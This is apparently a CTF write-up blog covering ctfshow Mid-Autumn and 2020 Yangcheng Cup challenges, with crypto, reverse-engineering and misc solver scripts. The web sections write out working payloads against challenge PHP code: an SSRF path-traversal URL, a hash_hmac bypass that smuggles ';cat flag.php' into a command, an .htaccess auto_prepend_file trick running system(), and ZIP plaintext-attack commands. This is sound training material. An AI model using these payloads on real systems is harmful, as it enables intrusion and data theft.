12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];$c=$_GET[&#x27;c&#x27;];$url[1]=$_POST[&#x27;url&#x27;];if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123; $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c))); if($d)&#123; highlight_file(&#x27;hint.php&#x27;); if(filter_var($url[1],FILTER_VALIDATE_URL))&#123; $host=parse_url($url[1]); print_r($host); if(preg_match(&#x27;/ctfshow\\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123; print_r(file_get_contents($url[1])); &#125;else&#123; echo &#x27;差点点就成功了！&#x27;; &#125; &#125;else&#123; echo &#x27;please give me url!!!&#x27;; &#125; &#125;else&#123; echo &#x27;想一想md5碰撞原理吧?!&#x27;; &#125;&#125;else&#123; echo &#x27;第一个都过不了还想要flag呀?!&#x27;;&#125; 三层绕过。 第一层 is_numeric()函数限定a必须为数字，可用字符：0123456789e.+-， strlen()函数限定a在7个字符内，同时又要满足a!=0和a*a=0， 考虑到PHP浮点数精度溢出，构造a接近于0，且足够小的数，如xe-xxx的形式， 开始尝试构造a=9e-999失败，因过小导致a=0，缩小小数位使a不溢出且a*a溢出，a=9e-199成功。 第二层 纯爆破头爆炸都无果，谁能想到代码类web题会有robots.txt？ Is it particularly difficult to break MD2?!I’ll tell you quietly that I saw the payoad of the author.But the numbers are not clear.have fun~~~~xxxxx024452 hash(&quot;md2&quot;,$b)xxxxxx48399 hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b)) 有了hint好办许多，考虑PHP中的弱类型比较，对于0e开头且后部分纯数字的字符串作0看，爆： 12345678910111213141516171819202122from Crypto.Hash import MD2for i in range(1000): h = MD2.new() h.update(b&#x27;0e&#x27;+str(i).zfill(3).encode()+b&#x27;024452&#x27;) x=h.hexdigest() if x.startswith(&#x27;0e&#x27;) and x[2:].isdigit(): print(i)print() for i in range(10000): h = MD2.new() h.update(b&#x27;0e&#x27;+str(i).zfill(4).encode()+b&#x27;48399&#x27;) x=h.hexdigest() k = MD2.new() k.update(x.encode()) xx=k.hexdigest() if xx.startswith(&#x27;0e&#x27;) and xx[2:].isdigit(): print(i)#652#6034 得到b=0e652024452&amp;c=0e603448399 第三层 过两层得到hint：$flag=&quot;flag in /fl0g.txt&quot;; ssrf绕过。filter_var函数可以解析多种协议，试试不是http的协议： url=0://ctfshow.com 可以成功得到host值绕过filter_var和preg_match函数。 parse_url函数用来解析URL，并把URL分割成特定的部分，在payload后构造路径可以成功将路径写入path值： url=0://ctfshow.com/../../../../../fl0g.txt ​ web3_莫负婵娟 皎洁一年惟此夜，莫教容易负婵娟 Hint: 环境变量 +linux字符串截取 + 通配符 Hint放出前，利用通配符_爆出了密码，登录后不知下步。 过滤了&#39;和(，没想到绕过binary的方法。 纯粹不会，仅是留坑。 补充：全程在想怎么绕过binary，没注意密码位数…. 解法参考月饼王师傅wp。 ​ MISCmisc1_共婵娟 但愿人长久，千里共婵娟 MISC之王争夺战！ 两密一一对应，填入神秘代码 Hint1: 神秘代码中有东西缺失，填补后开阔思维， / 仅是分隔线 Hint2: https://pan.baidu.com/ Hint3: 最后一步：y=ax+b 【预留待写】 ​ misc2_洗寰瀛 天将今夜月，一遍洗寰瀛 来自神秘力量的入侵，掌握核心秘密 https://ctfshow.lanzous.com/iDybQgvymsb Hint1: 步骤1预计时间为50分钟 Hint2: zip明文攻击 Hint3: https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md Hint4: flag[0:9]==’flag{TriG’，可能字体文件有问题 原理： 明文攻击顾名思义我们需要知道解密后的内容来反推密钥。所以不是什么Zip压缩包拿来都可以完全只通过处理密文破解，需要做一些分析。 Biham和Kocher在1994年提出了一种针对ZipCrypto的明文攻击 ，仅需12字节的明文信息就可以运行该算法。该算法得到的是ZipCrypto内部的密钥，所以和密码复杂度无关。只有12字节时，复杂度是 $2^{40}$，多提供一字节就去掉不少可能性。 Stay提出了新的一种明文攻击方法，只需要4个明文字节，复杂度为 $2^{63}$，但是可以使用多个文件大幅降低复杂度。Jeong有一些对BK94的改进，他们也使用了同一压缩包内的更多的文件。因为明文的推断常常是看文件头的，所以使用更多文件有一定的合理性。Stay还发现了Winzip的随机数生成漏洞，可以在没有任何明文的情况下使用5个同一压缩包的密文文件，以 $2^{39}$ 复杂度破解（2002年的文章，Winzip我猜肯定已经修复了）。 但是不管怎么样，明文总是需要的，有了十几字节的明文（不一定要在文件头，但是需要知道偏移地址）用BK94破解就非常可行了。事实上我感觉获取十几字节明文的难度和4字节差别不大，所以最主要的还是考虑BK94方法。最大的问题在于怎么获得明文。文件头很好猜，大多数文件十几个字节的文件头还是比较固定的。麻烦的是Zip先压缩后加密，明文是经过压缩处理的。很久以前，Zip是用Implode压缩，压缩后的内容是比较容易确定的，这大概也就是Biham在文章里说有200字节未压缩的明文就够了的原因。现在Zip都是用Deflate压缩，Deflate是已经标准化的压缩格式，先运行LZ77，再运行哈夫曼编码器 。Deflate采用动态哈夫曼编码的时候，将文件分为不同的块，每块最长为64KB。哈夫曼树在每一个块的前部，所以如果有文件头部的64KB，那大概可以算出压缩后的明文（还得考虑压缩参数）。Deflate压出来的文件熵是很高的，需要整个块的信息才有可能推出哈夫曼树，这使得明文攻击的难度大大提升。 虽然猜测明文难度因Deflate的使用大大提高，但是也不是不可能的，关键在于一些格式本来就已经压缩过了，Deflate压不动了，放弃了治疗，基本保留了原文。 BK94的方法实现网上有现成的，有见到比较多的PKCrack。这个软件2003年的，有点老了，还必须提供整个明文文件（这种是用于一个大的压缩包里有小的文件互联网上找得到的）。所以这里我推荐另外一个github上叫kimci86老哥写的版本，这位老哥写的性能好，C++代码漂亮，重要的是提供了偏移选项，用起来更灵活。具体使用方法参见他仓库里的example/tutorial.md。 参考：https://zhuanlan.zhihu.com/p/129855130 结合Hint2和Hint3，使用bkcrack工具照步骤复现即可。 查看压缩文件信息：unzip -Z Triglavian.zip 获取CRC值：unzip -Z -v Triglavian.zip Triglavian.png | grep CRC（2c810480） 生成明文部分文件：echo -n -e &#39;\\x2c\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52&#39; &gt; header.txt 明文攻击：./bkcrack -C Triglavian.zip -c Triglavian.png -p header.txt -o -1 约20+min得到密钥：be056038 a143c0c 1ea08ca5 还原出原文件：./bkcrack -C Triglavian.zip -c Triglavian.png -k be056038 a143c0c 1ea08ca5 -d Triglavian.png 奇怪的编码肯定是flag，用关键字“Triglavian 密码”知为深渊三神裔字体(Triglavian fonts)，也叫特格拉文，对照密码表解码（修改其中的g为G）。 参考： http://eve.netease.com/forum.php?mod=viewthread&amp;tid=6742 https://www.ackurdeeve.com/201902/triglavianfonts/ ​ 附加misc_问青天 明月几时有，拿饼问青天 密码为你听到的一句话 稍微有点难度 根据现实改编 东施效颦而已 附件：welcome.zip Hint1: gif图片中两个字母o代表氢原子的能级，当氢原子的电子发生能级跃迁时，间隔为10亿分之7秒 Hint2: 小姐姐声音是aiff格式 分离gif图片，得到两帧对应的bmp图片， 16进制查看gif文件，结合Hint2，可以分离出1个jpg图片文件+1个aiff音频文件+1个加密zip文件。 bmp图片和jpg图片均有特殊符号，暂不知用处。 播放aiff音频，将速度调慢，得到内容“欢迎ctfshow的小哥哥来玩”，可解密zip文件，得到1个png图片文件。、 尝试长换1短换0，二进制转换字符，发现就是flag。 原来Hint1和bmp+jpg图片都是虚晃一枪，辛苦群主PS了啊… ​ CRYPTOcrypto1_中秋月 此夜中秋月，清光十万家 自动钥匙⊕ 明文全大写，得到后转小写，并以_连接单词。 格式：flag{xxx}。 Hint1: 某古典密码 Hint2: 经此古典密码加密后，密文还是大写 Hint3: 该古典密码的密钥形式：keyword+plaintext (+plaintext…+plaintext) （内容部分引用月饼王师傅wp 懒…） Autokey密码+异或操作。 先爆破得到异或结果： 123456789s=&#x27;fsskryenvkm~jl&#123;ejs&#125;jwflzsnpgmifq&#123;&#123;j&#123;|suhzrjppnx|qvixt~whu&#x27;for i in range(255): res=&#x27;&#x27; for j in range(0,len(s)): temp = ord(s[j])^i if 65&lt;=temp&lt;=90 or 97&lt;=temp&lt;=122: #由大小写字母构成 res += (chr(temp)) if len(res)==len(s): print(res) 结合Hint2，发现全大写字符串：YLLTMFZQITRAUSDZULBUHYSELQOXRVYNDDUDCLJWEMUOOQGCNIVGKAHWJ。 再上Autokey爆破脚本，得key：KEYFORFLAG，明文：OHNOYOUFINDTHEFLAGTHEFLAGFORYOUISDOYOULIKECLASSICALCIPHER ​ crypto2_月自圆 世远人何在？天空月自圆。 Baby (Don’t) Cry （内容部分引用月饼王师傅wp 懒…） 明文长度为71位，加密后为142位。这里由于a不大，salt长度也不长，且明文m中存在flag，正好可以用这几位去爆破出a和salt。flag在明文m中的位置是53，对应密文c中的位置是105。flag出现的位置正好对应salt的位置。 写脚本爆出a和salt： 1234567891011121314151617181920212223242526272829303132333435363738394041import stringlower = string.printable[10:36]x0=set()y0=dict()for a in range(50,101): for s0 in lower: if hex((102*a+ord(s0)) % 128) == &#x27;0x1c&#x27;: x0.add(a) y0[a]=s0x1=set()y1=dict()for a in range(50,101): for s1 in lower: if hex((108*a+ord(s1)) % 128) == &#x27;0x29&#x27;: x1.add(a) y1[a]=s1x2=set()y2=dict()for a in range(50,101): for s2 in lower: if hex((97*a+ord(s2)) % 128) == &#x27;0x56&#x27;: x2.add(a) y2[a]=s2 x3=set()y3=dict()for a in range(50,101): for s3 in lower: if hex((103*a+ord(s3)) % 128) == &#x27;0x66&#x27;: x3.add(a) y3[a]=s3a=(x0&amp;x1&amp;x2&amp;x3).pop()print(a)print(y0[a])print(y1[a])print(y2[a])print(y3[a]) 得到后，解密： 12345678910111213141516a = 67si=b&#x27;jesq&#x27;si=list(si)print(si)c = &#x27;3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a&#x27;cc=list()for i in range(len(c)//2): cc.append(int(c[2*i:2*i+2],16))print(cc)flag=&#x27;&#x27;for i in range(len(cc)): for m in range(0,127): if (m*a+si[i%4])%128 == cc[i]: flag+=chr(m)print(flag) ​ crypto3_多少离怀 多少离怀起清夜，人间重望一回圆。 Weird Γ(x)? Hint1: 注意伽马函数Γ(x)和阶乘x!的关系式 Hint2: 威尔逊定理 （内容部分引用月饼王师傅wp 懒…） 我们需要求gamma(B+2)%A，根据伽马函数Γ(x)和阶乘x!的关系式可知(B+1)! % A。而根据威尔逊定理可知(A-2)! % A = 1。令x = (A-2)!/(B+1)!，y = (B+1)!，所以x * y ≡ 1 (mod A)。而我们需要求的是y % A，y是x关于A的逆元。所以求x % A的逆元即可。这里由于A、B相差还不到10万，所以很容易求解出x % A。 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import getPrime,isPrimeimport gmpy2def nextPrime(n): n += 2 if n &amp; 1 else 1 while not isPrime(n): n += 2 return n def factorial_mod(A,B): ans = 1 tmp = pow(-1,1,A) for i in range(B+1,A): ans = (ans*gmpy2.invert(i,A))%A return (ans*tmp)%A pA = 6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789pB = 6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147qA = 7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291qB = 7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457n = 4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119c = 1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374e = 0x10001p = nextPrime(factorial_mod(pA,pB+1))q = nextPrime(factorial_mod(qA,qB+1))r=gmpy2.iroot(n//(p*q*q),3)[0]phi=(p-1)*q*(q-1)*r*r*(r-1)d=gmpy2.invert(e,phi)flag=gmpy2.powmod(c,d,n)import binasciiprint(binascii.unhexlify(hex(flag)[2:])) ​ REVERSEre1_西北望乡 西北望乡何处是，东南见月几回圆。 附件：re IDA反编译，main函数中关键代码： 代码逻辑： flag长度45，取flag的第3、6、13、36个字符值及13共五个数作为key，假设为 $k_0,k_1,k_2,k_3,k_4$； 第一个for循环分别计算 $k_4^5,k_3^4,k_2^3,k_1^2,k_0^1$，存入b数组：$b_0,b_1,b_2,b_3,b_4=k_4^5,k_3^4,k_2^3,k_1^2,k_0^1$； 第二个for循环将flag分为9组，每组5个字符，对每组字符，假设该组字符为 $c_0,c_1,c_2,c_3,c_4$，计算 $\\sum=c_0b_0+c_1b_1+c_2b_2+c_3b_3+c_4b_4=c_0k_4^5+c_1k_3^4+c_2k_2^3+c_3k_1^2+c_4k_0$ 最后判断9个求和得到的值是否与arr数组相等。 由于flag前五字符为flag&#123;，即为第1组， 有k0=ord(&#39;g&#39;)，又k4已知，可以爆破key中的 k1、k2和k3值： 1234567891011121314import stringdic=string.ascii_lowercase+&#x27;_&#x27;arr=[11377526307,11291274669,10667335421,12105207237,12005384512,10853488462,12005544354,10651566902,5399147315,11333307]for x in dic: for y in dic: for z in dic: k=ord(&#x27;f&#x27;)*(13**5)+ord(&#x27;l&#x27;)*(ord(x)**4)+ord(&#x27;a&#x27;)*(ord(y)**3)+ord(&#x27;g&#x27;)*(ord(z)**2)+ord(&#x27;&#123;&#x27;)*ord(&#x27;g&#x27;) if k==arr[0]: print(x,y,z)#101 101 107#x=k3=101#y=k2=101#z=k1=107 故 key=[103,107,101,101,13] 照葫芦画瓢，对剩下8组每组分别爆破即可： （纯小写字母+_情况下最后一组无结果，增加数字） 12345678910111213141516171819202122232425262728293031323334import stringdic=string.ascii_lowercase+&#x27;_&#x27;key=[103,107,101,101,13]arr=[11377526307,11291274669,10667335421,12105207237,12005384512,10853488462,12005544354,10651566902,5399147315,11333307]def bruteforce_mid(val): for a in dic: for b in dic: for c in dic: for d in dic: for e in dic: sum=ord(a)*(key[4]**5)+ord(b)*(key[3]**4)+ord(c)*(key[2]**3)+ord(d)*(key[1]**2)+ord(e)*key[0] if sum==val: return a+b+c+d+e def bruteforce_last(val): dic=dic=string.ascii_lowercase+string.digits+&#x27;_&#x27; for a in dic: for b in dic: for c in dic: for d in dic: sum=ord(a)*(key[4]**5)+ord(b)*(key[3]**4)+ord(c)*(key[2]**3)+ord(d)*(key[1]**2)+ord(&#x27;&#125;&#x27;)*key[0] if sum==val: return a+b+c+d+&#x27;&#125;&#x27;flag=&#x27;flag&#123;&#x27;for i in range(1,8): flag+=bruteforce_mid(arr[i]) print(flag)flag+=bruteforce_last(arr[8])print(flag)#flag&#123;okok_here_is_your_flag_where_are_my_36d&#125; ​ re2_归心 满月飞明镜，归心折大刀 你应该见过python代码打包成的exe，猜猜这是什么语言 附件：readme.zip 拖入IDA查看字符串，发现java.exe/openjdk/jre字样，猜测为java打包成的jar转的exe文件。 jar转exe大多使用exe4j工具，exe4j只是将java程序，使用自己的方式打包了一下而已，所以运行的时候还是会转成jar来运行，而jar文件必定存储在本地的固定位置。所以反编译的步骤如下： 运行exe程序； 到C盘搜索readme.jar，找到它及其依赖jar包（用Everything可快速搜索）； 使用jd-gui反编译readme.jar，查看源码找到flag。 ​ re3_若无月 此夜若无月，一年虚过秋 misc2后续故事你所看到的，是一个被神秘力量入侵的屏幕flag格式为flag/your_flag/ Hint1: base64 is trap Hint2: 预期解法hint:魔改RC4认可的非预期解法hint:1/192几率直接显示flag 赛后对照着RC4算法啃做出。 IDA-F5找到关键字“Triglavian”+一串类似base64密文+一串类似base64码表，跟进关键字进入sub_401360函数，在case 1u内找到关键代码： 对照标准RC4算法： RC4算法包括初始化算法（KSA）和伪随机子密码生成算法（PRGA）两大部分。(RC4 algorithm including initialization algorithm (KSA) and pseudo-random sub-password generation algorithm (PRGA) two parts.) 1234567891011121314151617181920212223242526272829303132333435363738394041def KSA(key): keylength = len(key) S = range(256) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 256] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: key = &#x27;Key&#x27; plaintext = &#x27;Plaintext&#x27; def convert_key(s): return [ord(c) for c in s] key = convert_key(key) keystream = RC4(key) import sys for c in plaintext: sys.stdout.write(&quot;%02X&quot; % (ord(c) ^ keystream.next())) print sub_401360函数中实现了KSA部分，可以发现改动了初始key数组（使用的newkey数组为aTriglavian变量中各字母对应码表的下标值，而非简单的字母对应ASCII值）和数组大小（使用64，非256）。 再往下看未发现PRGA部分，回到汇编代码文本视图，全局搜索S[，发现另一个函数sub_401160也存在： 跟进sub_501160函数，发现RC4算法的PRGA部分： 可以发现最后的异或部分，选取密文中每个字母，得到对应码表的下标值k，与标准生成的密钥流S[(S[i] + S[j]) % 64]异或后得到新下标值，替换成码表中对应的字母。由于RC4的对称性，结果即为明文。 魔改RC4解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152key = &#x27;Triglavian&#x27;lenk = len(key)cipher = &#x27;20c1LOP2FnBOCMhPbCdtXTHmpgoK7g1sPN0KCcaBs3sWx/5Bob1t6IJaahW6SUGpTW11DmhJGeTj3UCSPCOZYaLw9qmg80kN56XF+dNhBYlfKbWqwSKJl+zTBvH0yBLDy7nwJ1W/SeBW+LaUV1Dq4FRnogzD5FOHNknyfyMerA3o5lgRq03f2M5C7ixuJ6WK&#x27;dict = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;newkey = [-1]*64def KSA(key): S = list(range(64)) j = 0 for i in range(64): j = (j + S[i] + newkey[i]) % 64 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 64 j = (j + S[i]) % 64 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 64] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: i = 0 while 1: j = 0 while key[i%lenk] != dict[j]: j += 1 if j &gt;= 64: break newkey[i] = j i += 1 if i &gt;= 64: break print(newkey) #newkey = [19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32] keystream = RC4(newkey) flag = &#x27;&#x27; for c in cipher: flag += dict[dict.find(c) ^ keystream.__next__()] print(flag) ​ PWNpwn_天涯共此时 海上生明月，天涯共此时 附件：pwn.zip 纯粹不会，仅是留坑。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020年羊城杯网络安全大赛","slug":"match-2020年羊城杯网络安全大赛","date":"2020-09-10T15:56:20.000Z","updated":"2020-09-11T15:07:37.611Z","comments":true,"path":"2020/09/10/match-2020年羊城杯网络安全大赛/","link":"","permalink":"https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ WEBeasycon 一窝蚂蚁大概有500-2000只，而梵蒂冈只有800人，如果这窝蚂蚁入侵梵蒂冈，他们要提着菜刀才能解决这群蚂蚁，但是你并不关心你只关心你自己 183.129.189.60:10021 御剑扫描出index.php页面，访问提示eval post cmd， POST传参cmd=system(&quot;ls -al&quot;);发现当前目录下有文件bbbbbbbbb.txt： 回到页面访问，得到一串base64图片后缀字符串，加上base64头data:image/png;base64,，在URL访问得到图片中显示的flag： flag: GWHT{do_u_kn0w_c@idao} ​ BlackCat 眼睛瞪得像铜铃 183.129.189.60:10022 查看源码发现提示都说听听歌了！，下载mp3文件查看16进制，发现最后有关键源码： 1234567891011121314151617if(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123; die(&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;);&#125;$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST[&#x27;White-cat-monitor&#x27;])) $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123; die(&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;);&#125;echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]); 需传入三个参数Black-Cat-Sheriff，One-ear，White-cat-monitor，用环境变量clandestine的值作为key对White-cat-monitor值进行sha256哈希运算，得到的结果再作为key用来对One-ear值进行sha256哈希运算，结果与Black-Cat-Sheriff相等则成功执行命令。 利用hash_hmac函数传入数组返回false的缺陷： 12$hmac = hash_hmac(&#x27;sha256&#x27;, Array(), &quot;SecretKey&quot;);echo $hmac == false; 传入数组返回false，再次运算时则无需key即可直接得到sha256哈希运算值。 通过修改One-ear命令及对应的Black-Cat-Sheriff值，最后拿到flag。 payload: White-cat-monitor[]=&amp;One-ear=;cat flag.php&amp;Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6 flag: GWHT{y0u_mu3t_p@y_atTentiou_!0_lt} 参考：SPOT THE BUG CHALLENGE 2018 WARM-UP ​ easyphp Easyphp 183.129.189.60:10023 题目逻辑： 访问时清除目录下除index.php文件外的其他文件，且只能写一次；另外限制字符为a-z和.，只有index.php文件解析， 考虑写入.htaccess文件，拆开关键字用\\换行以绕过正则过滤，利用 php_value auto_prepend_file .htaccess 让php文件包含.htaccess文件，从而执行代码： 12345678import requestsurl = &#x27;http://183.129.189.60:10023/sandbox/74adfb351cd5c3621c62d62e0785f24c/&#x27;payload = &#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\\\%0Ale%20&quot;.htaccess&quot;\\n%23&lt;?php system(\\&#x27;tac /fl&quot;a&quot;g\\&#x27;);?&gt;\\\\&#x27;url2 = url + payloadr = requests.get(url2)req = requests.get(url)print(req.content) flag: GWHT{easyApache} 参考：2019Xnuca Ezphp ​ MISCcom 老知识？ nc ip port 183.129.189.60:10028 nc，选择[1] Sign in得到多行多列数字，每行最后一个数字很大，易知为求解线性方程组。 调整好list格式，导出A和B矩阵： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546s = &#x27;&#x27;&#x27;352 971 218 64 892 633 999 122 123 792 727 822 719 16 780 261 264 317 721 957 517 1017 991 348 394 869 320 766 717 667 731 58 413 64 955 85069331023 635 210 93 822 102 584 905 79 257 259 482 662 323 833 503 270 393 411 7 879 918 905 336 822 905 204 190 651 653 899 333 266 750 755 8980959309 516 404 568 599 827 371 594 332 849 596 773 39 962 860 258 669 430 439 803 720 27 349 727 637 587 806 441 668 803 82 446 959 14 504 8846004740 858 936 187 273 53 28 758 934 228 465 549 809 582 854 404 705 448 741 151 22 831 558 73 472 665 126 949 144 986 643 997 92 881 557 7807051740 158 620 912 266 1013 796 718 563 379 70 523 438 424 213 230 908 135 753 182 369 869 570 335 670 693 691 536 217 809 665 222 82 959 31 8483230841 673 73 676 652 87 141 148 850 360 0 380 958 839 595 431 92 65 673 698 638 491 73 462 114 414 888 364 470 526 1012 543 794 720 744 8045288401 490 262 971 940 535 93 1003 427 149 250 614 939 392 848 941 109 851 610 773 56 132 512 39 980 924 804 490 156 111 596 227 369 525 864 85385801010 82 401 277 207 10 766 623 594 287 318 46 465 122 747 895 101 448 931 201 278 554 1007 914 524 472 861 230 65 585 504 133 858 443 169 859817424 492 794 572 1002 650 185 519 556 484 215 622 765 498 818 1002 908 906 798 168 802 414 650 872 20 422 677 469 129 903 823 693 791 538 154 9669615193 369 816 16 832 195 350 157 788 474 842 378 221 922 58 965 345 61 512 4 940 251 705 891 506 49 427 149 552 967 649 756 164 639 88 7413954853 364 480 712 448 505 722 6 580 820 143 174 716 381 814 635 689 99 939 564 901 881 301 796 984 44 392 818 803 702 817 488 127 340 188 8596218771 953 261 317 610 8 372 794 469 874 531 629 252 393 52 919 12 568 46 970 722 306 928 597 993 442 158 385 636 226 363 302 977 138 473 8848620224 584 993 838 889 769 342 360 734 464 871 584 21 683 1003 465 146 665 492 309 89 212 843 4 53 191 512 535 439 325 888 343 567 427 9 7388411961 269 239 353 778 88 592 995 673 29 382 180 788 915 496 278 591 933 770 629 64 777 834 1015 776 763 147 192 915 986 466 256 335 380 653 9793294699 35 335 332 424 388 819 194 791 557 771 627 895 995 389 550 387 293 175 16 837 898 768 9 136 33 728 593 556 154 755 411 193 969 802 8135375749 832 428 87 475 816 331 1001 338 909 6 854 669 970 781 274 556 194 896 51 566 988 993 732 805 978 536 566 553 696 235 319 625 670 944 9922037908 65 915 341 838 709 234 928 732 296 437 604 685 35 750 296 379 465 207 825 239 618 837 905 544 336 854 351 270 631 641 1004 238 509 696 8712695208 314 374 647 286 32 275 987 819 119 522 276 313 663 18 3 521 539 115 57 783 56 647 761 122 146 544 168 277 948 661 7 219 765 452 6473121689 32 710 20 73 611 523 377 751 812 370 905 598 5 156 796 954 443 349 202 444 996 711 1012 831 558 254 785 297 916 98 896 749 788 134 9310929223 941 599 396 675 40 764 638 13 320 1013 267 370 175 733 946 845 644 271 812 727 815 683 685 753 818 686 315 378 160 529 440 877 613 220 9348582765 677 735 425 923 133 683 20 79 220 112 706 432 972 549 862 938 194 235 365 1004 945 696 646 157 44 700 870 168 695 162 640 687 337 623 8841182744 408 273 93 935 143 356 815 642 29 793 664 755 47 886 810 867 380 645 745 39 68 353 933 337 603 733 499 986 773 604 559 106 947 567 8965864161 85 548 849 4 843 383 209 672 761 209 149 473 776 1014 426 582 579 406 1006 367 578 234 779 20 263 155 203 649 925 106 287 696 73 461 7258983757 685 465 259 64 523 306 179 945 995 82 859 646 981 928 181 606 289 387 507 834 360 327 86 245 219 603 520 667 162 331 546 245 299 1000 7464039309 992 939 155 930 15 579 705 267 546 307 370 855 462 843 145 535 740 586 531 1003 656 600 883 801 172 322 532 803 319 643 496 835 414 72 8863792571 286 93 300 806 548 451 530 804 875 724 709 637 28 145 763 446 264 480 691 540 699 807 236 515 770 623 793 458 1000 470 457 965 566 379 9882639901 238 651 488 778 35 14 127 1022 481 261 113 486 437 252 499 74 253 211 882 150 421 496 85 60 457 999 934 827 1018 496 539 428 510 892 8009103348 862 994 846 671 692 1011 730 83 875 146 858 205 55 811 669 943 425 372 837 365 386 692 353 784 488 774 297 367 414 92 307 975 686 210 9357962966 654 48 123 703 168 757 586 129 317 330 544 211 520 309 425 600 282 906 956 394 577 728 617 910 350 458 64 651 112 610 858 536 426 819 8059368250 187 608 352 563 714 664 829 625 649 581 345 110 36 153 659 487 1016 14 49 850 721 276 994 209 529 404 961 808 5 109 923 839 582 992 9366682128 320 933 837 149 374 22 663 647 1008 844 270 530 567 451 96 525 353 888 754 153 647 183 353 772 281 148 369 286 781 134 966 123 317 68 5933023794 278 989 582 849 10 529 943 902 679 39 420 492 191 360 348 1020 1020 551 808 113 307 468 524 444 801 792 817 350 16 898 554 975 842 700 10213211420 19 983 47 541 351 1014 428 236 710 502 74 399 142 586 30 419 485 543 665 741 861 340 396 272 797 405 238 765 362 742 606 199 661 360 7518069764 719 234 197 99 70 38 113 546 420 969 584 176 404 751 642 364 845 702 501 509 451 161 638 87 576 346 839 93 698 98 777 516 963 898 7135907265 984 660 638 1009 23 951 698 400 6 913 63 911 591 187 718 655 695 49 422 974 906 1010 198 178 73 39 402 258 77 695 969 536 789 675 8524911&#x27;&#x27;&#x27;.strip().split(&#x27;\\n&#x27;)A = []B = []for k in s: li = k.strip().split(&#x27; &#x27;) li = [int(x) for x in li] A.append(li[:-1]) B.append(li[-1])print(A)print(B) 